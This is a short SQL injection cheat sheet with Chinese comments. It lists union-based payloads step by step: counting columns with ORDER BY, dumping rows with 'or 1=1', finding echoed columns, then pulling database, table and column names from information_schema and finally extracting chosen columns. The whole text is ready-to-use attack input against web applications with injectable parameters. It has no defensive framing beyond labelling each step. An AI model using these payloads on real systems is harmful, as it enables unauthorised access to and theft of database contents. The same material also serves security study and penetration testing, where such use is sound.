#用于判断查询的列数
-1' ORDER BY n-- ;

#回显该表中所有待查询列的信息
-1' or 1=1-- ;

#用于查看哪些列会回显
-1' UNION SELECT 1,2,3-- ;

#泄露所有的数据库名信息
-1' UNION SELECT 1,2,group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA-- ;

#回显某数据库下的所有表名
-1' UNION SELECT 1,2,group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='DATABASE_NAME'-- ;

#回显某表下的所有列名
-1' UNION SELECT 1,2,group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='TABLE_NAME'-- ;

#回显表中某两列的信息
-1' UNION SELECT 1,COLUMN_NAME1, COLUMN_NAME2 FROM 'TABLE_NAME'-- ; 
